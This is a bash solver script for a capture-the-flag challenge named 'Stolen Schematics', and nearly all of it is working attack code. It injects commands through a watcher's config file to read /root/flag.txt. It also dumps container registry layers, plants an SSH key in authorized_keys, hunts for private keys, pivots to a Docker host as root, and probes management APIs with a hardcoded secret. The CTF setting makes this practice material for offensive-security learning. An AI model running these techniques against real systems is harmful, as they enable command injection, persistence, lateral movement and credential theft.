#!/bin/bash
# STOLEN SCHEMATICS - FINAL COMPREHENSIVE SOLVER
# Copy this entire script and run on Kali Linux

echo "=========================================="
echo "STOLEN SCHEMATICS - NUCLEAR SOLVER"
echo "=========================================="

# Connection details (UPDATE if instance changes)
HOST="instance.ctf.tdho.st"
PORT="32960"
PASS="reyalp"
USER="player"

echo "[*] Testing connection..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 $USER@$HOST -p $PORT "echo 'Connected'" 2>&1 | grep -q "Connected"
if [ $? -ne 0 ]; then
    echo "[!] Cannot connect to instance. Check credentials."
    exit 1
fi

echo "[+] Connection OK"

# ============================================================================
# PHASE 1: EXTRACT sync-loop.sh FROM GHCR.IO (PUBLIC REGISTRY)
# ============================================================================
echo ""
echo "=== PHASE 1: Searching for public Docker image on ghcr.io ==="

# Try to find the "accidentally public" image mentioned in challenge
# Common organization patterns for CTF
ORGS=(
    "tdho"
    "tdho-ctf"
    "hackfest"
    "ctf7"
    "ctf-tdho"
    "thedarkhandorg"
    "darkhand"
)

REPOS=(
    "stolen-schematics-watcher"
    "stolen-schematics"
    "watcher"
    "game-server"
)

for org in "${ORGS[@]}"; do
    for repo in "${REPOS[@]}"; do
        echo "[*] Trying: ghcr.io/$org/$repo"
        
        # Try to list tags (no auth needed if truly public)
        TAGS=$(curl -s "https://ghcr.io/v2/$org/$repo/tags/list" 2>/dev/null)
        
        if echo "$TAGS" | grep -q "tags"; then
            echo "[+] FOUND PUBLIC REPO: ghcr.io/$org/$repo"
            echo "$TAGS"
            
            # Extract all tags and download manifests
            echo "$TAGS" | jq -r '.tags[]' 2>/dev/null | while read tag; do
                echo "[*] Downloading tag: $tag"
                
                # Get manifest
                MANIFEST=$(curl -s -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
                    "https://ghcr.io/v2/$org/$repo/manifests/$tag")
                
                # Download each layer and search for sync-loop.sh
                echo "$MANIFEST" | jq -r '.layers[].digest' 2>/dev/null | while read digest; do
                    echo "  [*] Checking layer: $digest"
                    
                    curl -s -L "https://ghcr.io/v2/$org/$repo/blobs/$digest" | \
                        tar -xzO 2>/dev/null | grep -a "sync-loop.sh" && \
                        echo "[+] FOUND sync-loop.sh in this layer!"
                done
            done
        fi
    done
done

# ============================================================================
# PHASE 2: BRUTE FORCE ALL CONFIG FORMATS
# ============================================================================
echo ""
echo "=== PHASE 2: Brute forcing config formats ==="

cat > /tmp/test_configs.sh << 'CONFIGEOF'
#!/bin/bash

# All possible config format variations
CONFIGS=(
    # Original formats from bash history
    "talldwarf-sync-command=FILE-READ:/root/flag.txt"
    "talldwarf-sync-command=FILE-READ:/etc/flag.txt"
    "talldwarf-sync-command=cat /root/flag.txt"
    "talldwarf-sync-command=cat /etc/flag.txt"
    
    # With restrictions removed
    "talldwarf-sync-command=FILE-READ:/root/flag.txt\ntalldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true"
    "talldwarf-sync-command=cat /root/flag.txt\ntalldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true"
    
    # With output path
    "talldwarf-sync-command=FILE-READ:/root/flag.txt\ntalldwarf-sync-output=/tmp/flag.txt"
    "talldwarf-sync-command=cat /root/flag.txt\ntalldwarf-sync-output=/tmp/flag.txt"
    
    # Alternative parameter names
    "sync-command=FILE-READ:/root/flag.txt"
    "watcher-command=FILE-READ:/root/flag.txt"
    "action=FILE-READ:/root/flag.txt"
    "command=cat /root/flag.txt"
    "exec=cat /root/flag.txt"
    
    # JSON format
    '{"command":"cat /root/flag.txt","output":"/tmp/flag.txt"}'
    '{"action":"FILE-READ","path":"/root/flag.txt"}'
    
    # Base64 encoded command
    "talldwarf-sync-command=BASE64:Y2F0IC9yb290L2ZsYWcudHh0"
)

for i in "${!CONFIGS[@]}"; do
    CONFIG="${CONFIGS[$i]}"
    echo "[*] Trying config $i: $CONFIG"
    
    # Write config
    echo -e "$CONFIG" > /opt/mc/config/sync-request.conf
    
    # Create trigger if needed
    touch /opt/mc/config/sync.trigger
    
    # Wait for processing
    sleep 5
    
    # Check all possible output locations
    for output in /opt/mc/config/sync-result.conf /home/player/flagcap.txt /opt/mc/.sync/sync.result /tmp/flag.txt /tmp/flag /opt/mc/flag.txt /home/player/flag.txt; do
        if [ -f "$output" ]; then
            echo "[+] OUTPUT FOUND AT: $output"
            cat "$output"
            exit 0
        fi
    done
    
    # Check if flag appeared anywhere
    if grep -r "TDHO{" /tmp /home/player /opt/mc/config 2>/dev/null | head -1; then
        echo "[+] FLAG FOUND!"
        exit 0
    fi
done

echo "[!] No config format worked"
CONFIGEOF

chmod +x /tmp/test_configs.sh

sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no $USER@$HOST -p $PORT 'bash -s' < /tmp/test_configs.sh

# ============================================================================
# PHASE 3: EXTRACT FROM LOCAL REGISTRY WITH FULL LAYER DUMP
# ============================================================================
echo ""
echo "=== PHASE 3: Full registry extraction ==="

sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no $USER@$HOST -p $PORT << 'REGEOF'
python3 << 'PYEOF'
import urllib.request
import json
import gzip
import io
import tarfile
import sys

REG = "http://172.27.0.1:5000"

def get_url(url, accept="application/vnd.docker.distribution.manifest.v2+json"):
    req = urllib.request.Request(url)
    req.add_header("Accept", accept)
    try:
        return urllib.request.urlopen(req, timeout=15)
    except:
        return None

# Get all repos
try:
    repos_data = json.load(get_url(f"{REG}/v2/_catalog"))
except:
    print("[!] Cannot access registry")
    sys.exit(1)

for repo in repos_data.get('repositories', []):
    print(f"\n[*] Repository: {repo}")
    
    tags_resp = get_url(f"{REG}/v2/{repo}/tags/list")
    if not tags_resp:
        continue
        
    tags_data = json.load(tags_resp)
    
    for tag in tags_data.get('tags', []):
        print(f"  [*] Tag: {tag}")
        
        manifest_resp = get_url(f"{REG}/v2/{repo}/manifests/{tag}")
        if not manifest_resp:
            continue
            
        manifest = json.load(manifest_resp)
        
        for layer in manifest.get('layers', []):
            digest = layer['digest']
            
            blob_resp = get_url(f"{REG}/v2/{repo}/blobs/{digest}", "application/octet-stream")
            if not blob_resp:
                continue
                
            blob_data = blob_resp.read()
            
            # Try to decompress
            try:
                raw = gzip.decompress(blob_data)
            except:
                raw = blob_data
            
            # Extract tar
            try:
                tf = tarfile.open(fileobj=io.BytesIO(raw))
                for member in tf.getmembers():
                    # Look for sync-loop.sh
                    if 'sync-loop.sh' in member.name:
                        print(f"\n[+] FOUND: {member.name}")
                        print("="*70)
                        content = tf.extractfile(member).read().decode('utf-8', 'replace')
                        print(content)
                        print("="*70)
                        
                        # Save to file
                        with open('/tmp/sync-loop.sh', 'w') as f:
                            f.write(content)
                        print("[+] Saved to /tmp/sync-loop.sh")
            except Exception as e:
                pass

print("\n[*] Extraction complete")
PYEOF
REGEOF

# If sync-loop.sh was extracted, download it
echo "[*] Checking if sync-loop.sh was found..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no $USER@$HOST -p $PORT "cat /tmp/sync-loop.sh 2>/dev/null" > /tmp/sync-loop.sh.downloaded

if [ -s /tmp/sync-loop.sh.downloaded ]; then
    echo "[+] sync-loop.sh EXTRACTED!"
    cat /tmp/sync-loop.sh.downloaded
    echo ""
    echo "[*] Analyze the script above to determine correct config format"
else
    echo "[!] sync-loop.sh not found in registry"
fi

# ============================================================================
# PHASE 4: SSH KEY GENERATION AND PIVOT
# ============================================================================
echo ""
echo "=== PHASE 4: SSH key generation attack ==="

# Generate SSH key
ssh-keygen -t ed25519 -f /tmp/stolen_key -N "" -C "exploit" 2>/dev/null
PUBKEY=$(cat /tmp/stolen_key.pub)

echo "[*] Generated SSH key"
echo "[*] Trying to add to authorized_keys..."

sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no $USER@$HOST -p $PORT << KEYEOF
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "$PUBKEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo "[+] Key added"

# Try to find any SSH keys for pivoting to Docker host
echo "[*] Searching for SSH keys..."
find / -name "*.pem" -o -name "id_*" -o -name "*.key" 2>/dev/null | grep -v "proc"

# Check if we can access Docker host now
if [ -f ~/.ssh/id_rsa ] || [ -f ~/.ssh/id_ed25519 ]; then
    echo "[+] Found SSH key, attempting pivot..."
    ssh -o StrictHostKeyChecking=no player@172.27.0.1 "cat /root/flag.txt 2>&1"
    ssh -o StrictHostKeyChecking=no root@172.27.0.1 "cat /root/flag.txt 2>&1"
fi
KEYEOF

# ============================================================================
# PHASE 5: MANAGEMENT API EXPLOITATION
# ============================================================================
echo ""
echo "=== PHASE 5: Management API search ==="

sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no $USER@$HOST -p $PORT << 'APIEOF'
SECRET="dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ"

echo "[*] Testing management endpoints..."

# Common management ports
for PORT in 8080 8081 9000 9090 5000 3000; do
    echo "[*] Testing 172.27.0.1:$PORT"
    
    # Try with secret as header
    curl -s -m 2 -H "Authorization: Bearer $SECRET" "http://172.27.0.1:$PORT/flag" 2>/dev/null
    curl -s -m 2 -H "X-Management-Secret: $SECRET" "http://172.27.0.1:$PORT/flag" 2>/dev/null
    curl -s -m 2 "http://172.27.0.1:$PORT/flag?secret=$SECRET" 2>/dev/null
    
    # Try common endpoints
    curl -s -m 2 "http://172.27.0.1:$PORT/api/flag" 2>/dev/null
    curl -s -m 2 "http://172.27.0.1:$PORT/admin/flag" 2>/dev/null
done
APIEOF

# ============================================================================
# FINAL MESSAGE
# ============================================================================
echo ""
echo "=========================================="
echo "EXPLOITATION COMPLETE"
echo "=========================================="
echo ""
echo "If no flag found, check:"
echo "1. /tmp/sync-loop.sh.downloaded - analyze script for correct format"
echo "2. Try manual config formats based on script"
echo "3. New instance may be needed with fresh clues"
echo ""
echo "Time remaining on instance?"
